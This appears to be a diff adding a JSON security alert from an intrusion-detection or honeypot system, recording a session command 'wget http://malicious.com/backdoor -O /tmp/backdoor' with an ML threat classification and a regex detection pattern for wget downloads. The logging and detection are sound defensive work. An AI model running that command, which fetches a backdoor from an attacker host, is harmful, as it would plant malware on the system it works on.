@@ -1,0 +1,43 @@
+{
+  "alert_id": "1de6bc6f-f928-4feb-95a5-a74a4006d512",
+  "timestamp": "2025-08-23T20:48:36.546070",
+  "severity": "critical",
+  "session_id": "eb32603c-3a06-412f-ab48-052da3fca030",
+  "client_ip": "192.168.1.100",
+  "threat_report": {
+    "session_id": "eb32603c-3a06-412f-ab48-052da3fca030",
+    "client_ip": "192.168.1.100",
+    "command": "wget http://malicious.com/backdoor -O /tmp/backdoor",
+    "timestamp": "2025-08-23T20:48:36.532237",
+    "ml_classification": {
+      "category": "malware",
+      "confidence": 0.52,
+      "probabilities": {
+        "covering_tracks": 0.07,
+        "data_collection": 0.0,
+        "exfiltration": 0.01,
+        "lateral_movement": 0.01,
+        "malware": 0.52,
+        "privilege_escalation": 0.05,
+        "reconnaissance": 0.2,
+        "reverse_shell": 0.0,
+        "scanning": 0.14
+      }
+    },
+    "pattern_matches": [
+      {
+        "category": "data_exfiltration",
+        "severity": "critical",
+        "description": "Data exfiltration attempts",
+        "pattern": "\\bwget\\s+.*-O\\b"
+      }
+    ],
+    "sequence_matches": [],
+    "command_frequency": {
+      "detected": false
+    },
+    "threat_level": 4,
+    "threat_severity": "critical",
+    "session_command_count": 3
+  }
+}
